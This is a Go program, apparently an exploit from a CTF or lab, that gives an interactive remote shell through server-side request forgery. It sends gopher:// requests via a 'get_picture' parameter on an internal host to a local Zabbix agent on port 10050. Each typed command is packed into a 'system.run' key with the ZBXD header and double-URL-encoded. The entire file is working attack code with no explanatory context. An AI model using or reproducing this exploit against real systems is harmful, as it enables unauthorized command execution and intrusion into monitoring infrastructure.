package main

import (
	"bufio"
	"encoding/binary"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"os"
	"strings"
)

func doubleURLEncode(input string) string {
	// Aplica o URL encoding duas vezes
	encoded := url.QueryEscape(input)
	encoded = url.QueryEscape(encoded)
	// Substitui + por %20 para que espaços sejam preservados corretamente
	return strings.ReplaceAll(encoded, "%2B", "%20")
}

func main() {
	header := "ZBXD\x01"
	host := "http://10.10.0.5/?get_picture="

	reader := bufio.NewReader(os.Stdin)

	for i := 0; i < 1000; i++ {
		fmt.Print("Command: ")

		// Lê o comando do usuário
		key0, _ := reader.ReadString('\n')
		key0 = strings.TrimSpace(key0) // Remove espaços e quebras de linha

		if key0 == "exit" {
			os.Exit(0)
		}

		// Formata o comando com o template específico para o Zabbix
		key := fmt.Sprintf("system.run[(%s)]", key0)

		// Empacota o comprimento da chave + 2 como um inteiro de 64 bits em formato little-endian
		length := make([]byte, 8)
		binary.LittleEndian.PutUint64(length, uint64(len(key)+2))

		// Constrói a URL final com duplo URL encoding aplicado
		result := fmt.Sprintf("gopher://127.0.0.1:10050/_%s%s%s",
			doubleURLEncode(header),
			doubleURLEncode(string(length)),
			doubleURLEncode(key),
		)

		// Faz a requisição HTTP
		res, err := http.Get(host + result)
		if err != nil {
			fmt.Println(err)
			os.Exit(1)
		}

		// Lê o corpo da resposta
		body, err := ioutil.ReadAll(res.Body)
		if err != nil {
			fmt.Println(err)
			os.Exit(1)
		}
		defer res.Body.Close()

		// Imprime a resposta
		fmt.Println(string(body))
	}
}
